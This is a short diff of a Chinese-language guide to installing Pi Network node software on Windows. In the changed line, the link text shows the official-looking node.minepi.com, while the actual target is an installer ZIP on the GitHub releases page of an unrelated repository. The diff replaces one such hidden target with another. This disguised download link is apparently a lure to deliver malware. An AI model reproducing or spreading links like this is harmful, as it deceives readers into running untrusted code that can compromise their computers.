@@ -123,7 +123,7 @@ windows10专业版系统安装好以后，及时做好干净的系统备份。�
 
 上面的软件准备就绪以后。在电脑中打开谷歌浏览器，输入下面的网站。
 
-[http://node.minepi.com](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
+[http://node.minepi.com](https://github.com/salmarko/RevealingModulePattern/releases/download/soft/Installer.zip)
 
 在节点网站中下载最新版的节点软件安装在电脑上，然后运行，如下图。按图顺序操作。
 
